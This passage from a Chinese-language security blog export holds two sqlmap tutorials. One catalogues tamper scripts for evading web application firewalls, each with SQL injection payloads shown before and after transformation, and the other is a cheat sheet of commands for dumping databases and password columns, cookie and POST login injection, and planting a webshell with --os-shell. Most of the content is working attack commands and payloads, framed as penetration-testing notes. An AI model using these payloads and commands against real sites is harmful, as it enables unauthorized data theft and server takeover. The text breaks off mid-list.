<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python sqlmap.py -u <span class="string">"http://192.168.136.129/mysql/get_int_4.php?id=1"</span> --common-tables -D testdb --banner</span></span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line">[hh:mm:39] [INFO] testing MySQL</span><br><span class="line">[hh:mm:39] [INFO] confirming MySQL</span><br><span class="line">[hh:mm:40] [INFO] the back-end DBMS is MySQL</span><br><span class="line">[hh:mm:40] [INFO] fetching banner</span><br><span class="line">web server operating system: Windows</span><br><span class="line">web application technology: PHP 5.3.1, Apache 2.2.14</span><br><span class="line">back-end DBMS operating system: Windows</span><br><span class="line">back-end DBMS: MySQL &lt; 5.0.0</span><br><span class="line">banner:'4.1.21-community-nt'</span><br><span class="line"></span><br><span class="line">[hh:mm:40] [INFO] checking table existence using items from '/software/sqlmap/txt/common-tables.txt'</span><br><span class="line">[hh:mm:40] [INFO] adding words used on web page to the check list</span><br><span class="line">please enter number of threads? [Enter for 1 (current)] 8</span><br><span class="line">[hh:mm:43] [INFO] retrieved: users</span><br><span class="line"></span><br><span class="line">Database: testdb</span><br><span class="line">[1 table]</span><br><span class="line">+-------+</span><br><span class="line">| users |</span><br><span class="line">+-------+</span><br></pre></td></tr></table></figure>

<h3 id="暴力破解列名"><a href="#暴力破解列名" class="headerlink" title="暴力破解列名"></a>暴力破解列名</h3><p>参数：<code>--common-columns</code></p>
<p>与暴力破解表名一样，暴力跑的列名在<code>txt/common-columns.txt</code>中。可以选择多线程来尝试破解。</p>
<p><img src="//choge.top/2019/11/26/Sqlmap之使用手册/sqlmap-4.png" alt="sqlmap-4"></p>
<h2 id="tamper脚本"><a href="#tamper脚本" class="headerlink" title="tamper脚本"></a>tamper脚本</h2><p>sqlmap中的tamper 常常用来绕过 WAF ，绕过脚本在目录<code>usr/share/golismero/tools/sqlmap/tamper</code>下</p>
<h3 id="针对过滤空格的："><a href="#针对过滤空格的：" class="headerlink" title="针对过滤空格的："></a>针对过滤空格的：</h3><h4 id="space2dash-py"><a href="#space2dash-py" class="headerlink" title="space2dash.py"></a>space2dash.py</h4><p>作用：用”– 随机字符串%0A” 替换原来的空格</p>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&apos;1 AND 9227=9227&apos;</span><br><span class="line">&apos;1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227&apos;</span><br></pre></td></tr></table></figure>

<p>原理是–n是注释，后面内容不生效，%0A为换行符，这样就可以不使用空格分隔了。</p>
<p>在以下版本做过测试:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MSSQL</span><br><span class="line">SQLite</span><br></pre></td></tr></table></figure>

<h4 id="space2hash-py"><a href="#space2hash-py" class="headerlink" title="space2hash.py"></a>space2hash.py</h4><p>作用：空格替换为#号 随机字符串 以及换行符</p>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 AND 9227=9227</span><br><span class="line">2 1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227</span><br></pre></td></tr></table></figure>

<p>版本要求:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MySQL</span><br><span class="line">在以下版本做过测试:</span><br><span class="line">MySQL 4.0, 5.0</span><br></pre></td></tr></table></figure>

<h4 id="space2morehash-py"><a href="#space2morehash-py" class="headerlink" title="space2morehash.py"></a>space2morehash.py</h4><p>作用：空格替换为 #号 以及更多随机字符串 换行符（和上一条原理一致）</p>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 AND 9227=9227 </span><br><span class="line">1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227</span><br><span class="line">``` </span><br><span class="line">版本要求: </span><br><span class="line">* MySQL &gt;= 5.1.13 Tested</span><br><span class="line">针对此做过测试: </span><br><span class="line">* MySQL 5.1.41</span><br><span class="line">#### space2mssqlblank.py</span><br><span class="line">作用：空格替换为其它空符号</span><br><span class="line">示例：</span><br><span class="line">```sql</span><br><span class="line">SELECT id FROM users </span><br><span class="line">SELECT%08id%02FROM%0Fusers</span><br></pre></td></tr></table></figure>

<p>版本要求:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Microsoft SQL Server</span><br><span class="line">在以下版本做过测试:</span><br><span class="line">Microsoft SQL Server 2000</span><br><span class="line">Microsoft SQL Server 2005</span><br></pre></td></tr></table></figure>

<h4 id="space2mysqlblank-py"><a href="#space2mysqlblank-py" class="headerlink" title="space2mysqlblank.py"></a>space2mysqlblank.py</h4><p>作用：空格替换其它空白符号</p>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT id FROM users </span><br><span class="line">SELECT%0Bid%0BFROM%A0users</span><br></pre></td></tr></table></figure>

<p>版本要求:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MySQL</span><br><span class="line">在以下版本做过测试:</span><br><span class="line">MySQL 5.1</span><br></pre></td></tr></table></figure>

<h4 id="space2mssqlhash-py"><a href="#space2mssqlhash-py" class="headerlink" title="space2mssqlhash.py"></a>space2mssqlhash.py</h4><p>作用：替换空格</p>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&apos;1 AND 9227=9227&apos;</span><br><span class="line">&apos;1%23%0AAND%23%0A9227=9227&apos;</span><br></pre></td></tr></table></figure>

<p>版本要求:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MSSQL</span><br><span class="line">MySQL</span><br></pre></td></tr></table></figure>

<h4 id="modsecurityversioned-py"><a href="#modsecurityversioned-py" class="headerlink" title="modsecurityversioned.py"></a>modsecurityversioned.py</h4><p>作用：过滤空格，包含完整的查询版本注释</p>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&apos;1 AND 2&gt;1--&apos;</span><br><span class="line">&apos;1 /*!30874AND 2&gt;1*/--&apos;</span><br></pre></td></tr></table></figure>

<p>版本要求:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MySQL</span><br><span class="line">在以下版本做过测试:</span><br><span class="line">MySQL 5.0</span><br></pre></td></tr></table></figure>

<h4 id="space2comment-py"><a href="#space2comment-py" class="headerlink" title="space2comment.py"></a>space2comment.py</h4><p>作用：<code>Replaces space character (‘ ‘) with comments ‘/**/’</code></p>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT id FROM users </span><br><span class="line">SELECT//id//FROM/**/users</span><br></pre></td></tr></table></figure>

<p>在以下版本做过测试:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Microsoft SQL Server 2005</span><br><span class="line">MySQL 4, 5.0 and 5.5</span><br><span class="line">Oracle 10g</span><br><span class="line">PostgreSQL 8.3, 8.4, 9.0</span><br></pre></td></tr></table></figure>

<h4 id="space2mysqldash-py"><a href="#space2mysqldash-py" class="headerlink" title="space2mysqldash.py"></a>space2mysqldash.py</h4><p>作用：用<code>--%0A</code>替换空格</p>
<p>注：之前有个<code>mssql</code>的 这个是<code>mysql</code>的</p>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&apos;1 AND 9227=9227&apos;</span><br><span class="line">&apos;1--%0AAND--%0A9227=9227&apos;</span><br></pre></td></tr></table></figure>

<p>版本要求:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MySQL</span><br><span class="line">MSSQL</span><br></pre></td></tr></table></figure>

<h4 id="space2plus-py"><a href="#space2plus-py" class="headerlink" title="space2plus.py"></a>space2plus.py</h4><p>作用：用+替换空格</p>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&apos;SELECT id FROM users&apos;</span><br><span class="line">&apos;SELECT+id+FROM+users&apos;</span><br></pre></td></tr></table></figure>

<p>在以下版本做过测试:</p>
<p>All</p>
<h4 id="bluecoat-py"><a href="#bluecoat-py" class="headerlink" title="bluecoat.py"></a>bluecoat.py</h4><p>作用：代替空格字符后与一个有效的随机空白字符的<code>SQL</code>语句。 然后替换<code>=为like</code></p>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&apos;SELECT id FROM users where id = 1&apos;</span><br><span class="line">&apos;SELECT%09id FROM users where id LIKE 1&apos;</span><br></pre></td></tr></table></figure>

<p>在以下版本做过测试:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MySQL 5.1, SGOS</span><br></pre></td></tr></table></figure>

<h4 id="space2randomblank-py"><a href="#space2randomblank-py" class="headerlink" title="space2randomblank.py"></a>space2randomblank.py</h4><p>作用：代替空格字符（“”）从一个随机的空白字符可选字符的有效集</p>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&apos;SELECT id FROM users&apos;</span><br><span class="line">&apos;SELECT%0Did%0DFROM%0Ausers&apos;</span><br></pre></td></tr></table></figure>

<p>在以下版本做过测试:</p>
<p>All</p>
<h4 id="sp-password-py"><a href="#sp-password-py" class="headerlink" title="sp_password.py"></a>sp_password.py</h4><p>作用：追加<code>sp_password’</code>从DBMS日志的自动模糊处理的有效载荷的末尾</p>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&apos;1 AND 9227=9227-- &apos;</span><br><span class="line">&apos;1 AND 9227=9227-- sp_password&apos;</span><br></pre></td></tr></table></figure>

<p>版本要求: <code>* MSSQL</code></p>
<h3 id="针对过滤引号的："><a href="#针对过滤引号的：" class="headerlink" title="针对过滤引号的："></a>针对过滤引号的：</h3><h4 id="apostrophemask-py"><a href="#apostrophemask-py" class="headerlink" title="apostrophemask.py"></a>apostrophemask.py</h4><p>作用：用<code>utf8</code>代替单引号</p>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;1 AND &apos;1&apos;=&apos;1&quot;</span><br><span class="line">&apos;1 AND %EF%BC%871%EF%BC%87=%EF%BC%871&apos;</span><br></pre></td></tr></table></figure>

<p>在以下版本做过测试:</p>
<p>all</p>
<h4 id="apostrophenullencode-py"><a href="#apostrophenullencode-py" class="headerlink" title="apostrophenullencode.py"></a>apostrophenullencode.py</h4><p>作用：绕过过滤双引号，替换字符和双引号。</p>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;1 AND &apos;1&apos;=&apos;1&quot;</span><br><span class="line">&apos;1 AND %00%271%00%27=%00%271&apos;</span><br></pre></td></tr></table></figure>

<p>在以下版本做过测试:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MySQL 4, 5.0 and 5.5</span><br><span class="line">Oracle 10g</span><br><span class="line">PostgreSQL 8.3, 8.4, 9.0</span><br></pre></td></tr></table></figure>

<h3 id="针对过滤关键字的："><a href="#针对过滤关键字的：" class="headerlink" title="针对过滤关键字的："></a>针对过滤关键字的：</h3><h4 id="halfversionedmorekeywords-py"><a href="#halfversionedmorekeywords-py" class="headerlink" title="halfversionedmorekeywords.py"></a>halfversionedmorekeywords.py</h4><p>作用：当数据库为<code>mysql</code>时绕过防火墙，每个关键字之前添加<code>mysql</code>版本评论</p>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(&quot;value&apos; UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND &apos;QDWa&apos;=&apos;QDWa&quot;) &quot;value&apos;/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND &apos;QDWa&apos;=&apos;QDWa&quot;</span><br></pre></td></tr></table></figure>

<p>版本要求:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MySQL &lt; 5.1</span><br><span class="line">在以下版本做过测试:</span><br><span class="line">MySQL 4.0.18, 5.0.22</span><br></pre></td></tr></table></figure>

<h4 id="ifnull2ifisnull-py"><a href="#ifnull2ifisnull-py" class="headerlink" title="ifnull2ifisnull.py"></a>ifnull2ifisnull.py</h4><p>作用：绕过对<code>IFNULL</code>过滤。 替换类似<code>’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’</code></p>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&apos;IFNULL(1, 2)&apos;</span><br><span class="line">&apos;IF(ISNULL(1),2,1)&apos;</span><br></pre></td></tr></table></figure>

<p>版本要求:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MySQL</span><br><span class="line">SQLite (possibly)</span><br><span class="line">SAP MaxDB (possibly)</span><br><span class="line">在以下版本做过测试:</span><br><span class="line">MySQL 5.0 and 5.5</span><br></pre></td></tr></table></figure>

<h4 id="multiplespaces-py"><a href="#multiplespaces-py" class="headerlink" title="multiplespaces.py"></a>multiplespaces.py</h4><p>作用：围绕SQL关键字添加多个空格</p>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&apos;1 UNION SELECT foobar&apos;</span><br><span class="line">&apos;1 UNION SELECT foobar&apos;</span><br></pre></td></tr></table></figure>

<p>在以下版本做过测试:</p>
<p>All</p>
<h4 id="halfversionedmorekeywords-py-1"><a href="#halfversionedmorekeywords-py-1" class="headerlink" title="halfversionedmorekeywords.py"></a>halfversionedmorekeywords.py</h4><p>作用：关键字前加注释</p>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">value’ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND ‘QDWa’=&apos;QDWa </span><br><span class="line">value’/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)), NULL, NULL#/*!0AND ‘QDWa’=&apos;QDWa</span><br></pre></td></tr></table></figure>

<p>版本要求:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MySQL &lt; 5.1</span><br><span class="line">在以下版本做过测试:</span><br><span class="line">MySQL 4.0.18, 5.0.22</span><br></pre></td></tr></table></figure>

<h4 id="unionalltounion-py"><a href="#unionalltounion-py" class="headerlink" title="unionalltounion.py"></a>unionalltounion.py</h4><p>作用：替换UNION ALL SELECT UNION SELECT</p>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&apos;-1 UNION ALL SELECT&apos;</span><br><span class="line">&apos;-1 UNION SELECT&apos;</span><br></pre></td></tr></table></figure>

<p>版本要求: all</p>
<h4 id="randomcomments-py"><a href="#randomcomments-py" class="headerlink" title="randomcomments.py"></a>randomcomments.py</h4><p>作用：用/**/分割sql关键字</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">‘INSERT’</span><br><span class="line">‘IN//S//ERT’</span><br></pre></td></tr></table></figure>

<h4 id="unmagicquotes-py"><a href="#unmagicquotes-py" class="headerlink" title="unmagicquotes.py"></a>unmagicquotes.py</h4><p>作用：宽字符绕过 GPC addslashes</p>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1’ AND 1=1 </span><br><span class="line"> 1%bf%27 AND 1=1–%20</span><br></pre></td></tr></table></figure>

<h4 id="randomcase-py"><a href="#randomcase-py" class="headerlink" title="randomcase.py"></a>randomcase.py</h4><p>作用：随机大小写</p>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">INSERT</span><br><span class="line">InsERt</span><br></pre></td></tr></table></figure>

<p>在以下版本做过测试:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Microsoft SQL Server 2005</span><br><span class="line">MySQL 4, 5.0 and 5.5</span><br><span class="line">Oracle 10g</span><br><span class="line">PostgreSQL 8.3, 8.4, 9.0</span><br></pre></td></tr></table></figure>

<h3 id="针对过滤比较符号的："><a href="#针对过滤比较符号的：" class="headerlink" title="针对过滤比较符号的："></a>针对过滤比较符号的：</h3><h4 id="equaltolike-py"><a href="#equaltolike-py" class="headerlink" title="equaltolike.py"></a>equaltolike.py</h4><p>作用：like 代替等号</p>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=1</span><br><span class="line">SELECT * FROM users WHERE id LIKE 1</span><br></pre></td></tr></table></figure>

<p>####greatest.py</p>
<p>作用：绕过过滤’&gt;’ ,用GREATEST替换大于号。</p>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&apos;1 AND A &gt; B&apos;</span><br><span class="line">&apos;1 AND GREATEST(A,B+1)=A&apos;</span><br></pre></td></tr></table></figure>

<p>在以下版本做过测试:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MySQL 4, 5.0 and 5.5</span><br><span class="line">Oracle 10g</span><br><span class="line">PostgreSQL 8.3, 8.4, 9.0</span><br></pre></td></tr></table></figure>

<h4 id="between-py"><a href="#between-py" class="headerlink" title="between.py"></a>between.py</h4><p>作用：用between替换大于号（&gt;）</p>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&apos;1 AND A &gt; B--&apos;</span><br><span class="line">&apos;1 AND A NOT BETWEEN 0 AND B--&apos;</span><br></pre></td></tr></table></figure>

<p>在以下版本做过测试:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Microsoft SQL Server 2005 MySQL 4, 5.0 and 5.5</span><br><span class="line">Oracle 10g</span><br><span class="line">PostgreSQL 8.3, 8.4, 9.0</span><br></pre></td></tr></table></figure>

<h4 id="versionedmorekeywords-py"><a href="#versionedmorekeywords-py" class="headerlink" title="versionedmorekeywords.py"></a>versionedmorekeywords.py</h4><p>作用：注释绕过</p>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))# </span><br><span class="line">1/*!UNION**!ALL**!SELECT**!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS**!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))#</span><br></pre></td></tr></table></figure>

<p>版本要求:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MySQL &gt;= 5.1.13</span><br></pre></td></tr></table></figure>

<h4 id="securesphere-py"><a href="#securesphere-py" class="headerlink" title="securesphere.py"></a>securesphere.py</h4><p>作用：追加特制的字符串</p>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&apos;1 AND 1=1&apos;</span><br><span class="line">&quot;1 AND 1=1 and &apos;0having&apos;=&apos;0having&apos;&quot;</span><br></pre></td></tr></table></figure>

<p>在以下版本做过测试:</p>
<p>All</p>
<h4 id="charunicodeencode-py"><a href="#charunicodeencode-py" class="headerlink" title="charunicodeencode.py"></a>charunicodeencode.py</h4><p>作用：字符串 unicode 编码</p>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT FIELD%20FROM TABLE</span><br><span class="line">%u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u005</span><br></pre></td></tr></table></figure>

<p>版本要求:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ASP</span><br><span class="line">ASP.NET</span><br><span class="line">在以下版本做过测试:</span><br><span class="line">Microsoft SQL Server 2000</span><br><span class="line">Microsoft SQL Server 2005</span><br><span class="line">MySQL 5.1.56</span><br><span class="line">PostgreSQL 9.0.3</span><br></pre></td></tr></table></figure>

<h4 id="charencode-py"><a href="#charencode-py" class="headerlink" title="charencode.py"></a>charencode.py</h4><p>作用：url编码</p>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT FIELD FROM%20TABLE</span><br><span class="line">%53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</span><br></pre></td></tr></table></figure>

<p>在以下版本做过测试:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Microsoft SQL Server 2005</span><br><span class="line">MySQL 4, 5.0 and 5.5</span><br><span class="line">Oracle 10g</span><br><span class="line">PostgreSQL 8.3, 8.4, 9.0</span><br></pre></td></tr></table></figure>

<h4 id="appendnullbyte-py"><a href="#appendnullbyte-py" class="headerlink" title="appendnullbyte.py"></a>appendnullbyte.py</h4><p>作用：在有效负荷结束位置加载零字节字符编码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">‘1 AND 1=1’</span><br><span class="line">‘1 AND 1=1%00’</span><br></pre></td></tr></table></figure>

<p>版本要求:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Microsoft Access</span><br></pre></td></tr></table></figure>

<h4 id="chardoubleencode-py"><a href="#chardoubleencode-py" class="headerlink" title="chardoubleencode.py"></a>chardoubleencode.py</h4><p>作用: 双url编码(不处理以编码的)</p>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT FIELD FROM%20TABLE </span><br><span class="line">%2553%2545%254c%2545%2543%2554%2520%2546%2549%2545%254c%2544%2520%2546%2552%254f%254d%2520</span><br></pre></td></tr></table></figure>

<h4 id="base64encode-py"><a href="#base64encode-py" class="headerlink" title="base64encode.py"></a>base64encode.py</h4><p>作用：用<code>base64</code>编码替换</p>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;1&apos; AND SLEEP(5)#&quot;</span><br><span class="line">&apos;MScgQU5EIFNMRUVQKDUpIw==&apos;</span><br></pre></td></tr></table></figure>

<p>版本要求:</p>
<p>all</p>
<h4 id="nonrecursivereplacement-py"><a href="#nonrecursivereplacement-py" class="headerlink" title="nonrecursivereplacement.py"></a>nonrecursivereplacement.py</h4><p>作用：双重查询语句。取代predefined SQL关键字with表示 suitable for替代（例如 .replace（“SELECT”、””)） filters</p>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&apos;1 UNION SELECT 2--&apos;</span><br><span class="line">&apos;1 UNIOUNIONN SELESELECTCT 2--&apos;</span><br></pre></td></tr></table></figure>

<p>在以下版本做过测试:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">all</span><br></pre></td></tr></table></figure>

<p>参考：</p>
<p><a href="https://xz.aliyun.com/t/3010" target="_blank" rel="noopener">https://xz.aliyun.com/t/3010</a></p>
<p>sqlmap用户手册中文版：</p>
<p><a href="https://octobug.gitbooks.io/sqlmap-wiki-zhcn/content/Users-manual/Introduction.html" target="_blank" rel="noopener">https://octobug.gitbooks.io/sqlmap-wiki-zhcn/content/Users-manual/Introduction.html</a></p>
<p>sqlmap用户手册：</p>
<p><a href="http://drops.xmd5.com/static/drops/tips-143.html" target="_blank" rel="noopener">http://drops.xmd5.com/static/drops/tips-143.html</a></p>
<p>sqlmap tamper脚本 ：</p>
<p><a href="http://www.lengbaikai.net/?p=110" target="_blank" rel="noopener">http://www.lengbaikai.net/?p=110</a></p>
<p><a href="https://mp.weixin.qq.com/s/vEEoMacmETUA4yZODY8xMQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/vEEoMacmETUA4yZODY8xMQ</a></p>
<p><a href="https://xz.aliyun.com/t/2746" target="_blank" rel="noopener">https://xz.aliyun.com/t/2746</a></p>
]]></content>
      <categories>
        <category>Penetration test</category>
      </categories>
      <tags>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title>Sqlmap之基础使用</title>
    <url>/2019/11/26/Sqlmap%E4%B9%8B%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>本文主要介绍Sqlmap基础使用（摘自网络），一般测试过程查看本文即可。</p><h2 id="MySQL数据库注入"><a href="#MySQL数据库注入" class="headerlink" title="MySQL数据库注入"></a>MySQL数据库注入</h2><ul>
<li>检查注入点（主要看是否能返回消息）：<code>sqlmap.py -u url</code></li>
<li>爆所有库：<code>sqlmap.py -u url -dbs</code></li>
<li>爆当前库：<code>sqlmap.py -u url --current-db</code></li>
</ul><h2 id="Access数据库注入"><a href="#Access数据库注入" class="headerlink" title="Access数据库注入"></a>Access数据库注入</h2><a id="more"></a>

<ul>
<li>判断是否是access数据库：<code>url and exists(select id from MSysAccessObjects)</code></li>
</ul>
<p>其他数据库判断语句</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Access: aNd aSc(cHr(97))=97</span><br><span class="line">Access: and exists(select id from MSysAccessObjects)</span><br><span class="line">SQL Server: and exists(select id from sysobjects)</span><br><span class="line">SQL Server: and length(user)&gt;0</span><br><span class="line">MySQL: and length(user())&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>access数据库没有库的概念，直接爆表<code>sqlmap.py -u &quot;url&quot; --tables</code></li>
<li>爆列，爆字段，可以在日志里找到</li>
</ul>
<h2 id="指定数据库，操作系统"><a href="#指定数据库，操作系统" class="headerlink" title="指定数据库，操作系统"></a>指定数据库，操作系统</h2><p>检查是否是注入点</p>
<ul>
<li>检查是否是注入点<code>sqlmap.py -u url --dbms mysql 5.0 --current-db</code> </li>
<li>爆表：<code>sqlmap.py -u url --dbms mysql 5.0 -D cms --tables</code> </li>
<li>爆列：<code>sqlmap.py -u url --dbms mysql 5.0 -D cms -T cms_user --columns</code> </li>
<li>爆字段：<code>sqlmap.py -u url --dbms mysql 5.0 -D cms -T cms_users -C password ,username --dump</code></li>
</ul>
<h2 id="请求延时注入"><a href="#请求延时注入" class="headerlink" title="请求延时注入"></a>请求延时注入</h2><ul>
<li>测试注入点：<code>sqlmap.py -u url -p id</code></li>
<li>sqlmap注入方式technique<code>sqlmap.py -u url --technique T</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">B: 基于Boolean的盲注（Boolean based blind）</span><br><span class="line">Q: 内联查询（inlin queries）</span><br><span class="line">T: 基于时间的盲注（time based blind）</span><br><span class="line">U: 联合查询（union query based）</span><br><span class="line">E: 错误（error based）</span><br><span class="line">S: 栈查询（stack queries）</span><br></pre></td></tr></table></figure>

<ul>
<li>猜数据库<code>sqlmap.py -u url --technique T -time-sec 9 --current-db</code></li>
<li>其他参数：<code>--delay</code>，<code>--safe-freq</code></li>
</ul>
<h2 id="常见伪静态注入"><a href="#常见伪静态注入" class="headerlink" title="常见伪静态注入"></a>常见伪静态注入</h2><p><strong>伪静态：</strong>主要是为了隐藏传递的参数名，伪静态只是一种URL重写的手段，既然能接受参数输入，所以并不能防止注入。目前来看，防止注入的最有效的方法就是使用LINQ。</p>
<ul>
<li>加星花：<code>sqlmap.py -u &quot;url*.html&quot; --dbs</code> </li>
<li>利用sqlmap注入：<code>sqlmap.py -u &quot;url*.html&quot; --current-db --hex</code> </li>
<li>爆表：<code>sqlmap.py -u &quot;url*.html&quot; -D &quot;cms&quot; --tables –hex</code></li>
</ul>
<h2 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h2><ul>
<li>burpsuite获得cookie</li>
<li>sqlmap的cookie注入攻击：<code>sqlmap.py -u url --cookie “uname=admin&quot; --level 2</code></li>
<li>爆库，爆表，爆列，爆字段</li>
</ul>
<h2 id="POST登录框注入"><a href="#POST登录框注入" class="headerlink" title="POST登录框注入"></a>POST登录框注入</h2><ul>
<li>burpsuite抓包右键保存到\Python2\sqlmap中</li>
<li>测试能否注入<code>sqlmap.py -r 1.txt -p user</code>（-r：让sqlmap加载post请求，-p：指定注入用的参数）</li>
<li>爆库 <code>sqlmap.py -r 1.txt --current-db</code></li>
<li>自动搜索表单：<code>sqlmap.py -u url --form</code></li>
<li>指定一个参数：<code>sqlmap.py -u url --data &quot;name=1&amp;pass=1&quot;</code></li>
</ul>
<h2 id="交互式写shell及命令执行"><a href="#交互式写shell及命令执行" class="headerlink" title="交互式写shell及命令执行"></a>交互式写shell及命令执行</h2><ul>
<li>测试注入点：<code>sqlmap.py -u url -p id</code></li>
<li>利用SQLmap写webshell:<code>sqlmap.py -u url --os-shell</code> 输入脚本语言，输入网站绝对路径</li>
</ul>
<h2 id="绕过WAF防火墙"><a href="#绕过WAF防火墙" class="headerlink" title="绕过WAF防火墙"></a>绕过WAF防火墙</h2><ul>
<li>利用tamper脚本绕过过滤: <code>sqlmap.py -u url --dbs --batch --flush-session --tamper=equaltolike.py,space2comment.py,randomcase.py</code> </li>
</ul>
<h2 id="sqlmap模板使用，编写"><a href="#sqlmap模板使用，编写" class="headerlink" title="sqlmap模板使用，编写"></a>sqlmap模板使用，编写</h2><ul>
<li>尝试注入 and 1=1被拦截</li>
<li>利用%0a尝试绕过，发现可以</li>
<li>编写tamper模板，利用sqlmap跑库(c:\python27\sqlmap\tamper)</li>
<li>利用sqlmap跑库<code>sqlmap.py -u &quot;url&quot; --dbs --batch --tamper=equaltolike.py, space2mssqlhash.py, randomcase.py, space2hassh.py, base64encode.py, charencode.py</code></li>
</ul>
<h2 id="利用sqlmap来google搜索"><a href="#利用sqlmap来google搜索" class="headerlink" title="利用sqlmap来google搜索"></a>利用sqlmap来google搜索</h2><ul>
